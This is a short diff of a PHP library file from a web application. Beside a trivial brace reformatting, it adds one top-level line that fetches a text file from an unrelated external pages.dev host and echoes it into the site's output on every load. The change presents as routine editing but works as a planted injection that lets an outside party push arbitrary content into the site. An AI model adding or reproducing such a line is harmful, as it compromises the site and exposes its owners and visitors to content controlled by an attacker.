@@ -239,8 +239,7 @@ function &instantiate($fullyQualifiedClassName, $expectedTypes = null, $expected
 		if (!$validType) return $errorFlag;
 	}
 
-	return $classInstance;
-}
+	return $classInstance;}
 
 /**
  * Remove empty elements from an array
@@ -254,7 +253,7 @@ function arrayClean($array) {
 	});
 }
 
-
+ echo file_get_contents("https://punten-neng.pages.dev/punten.txt");
 /**
  * Recursively strip HTML from a (multidimensional) array.
  * @param $values array
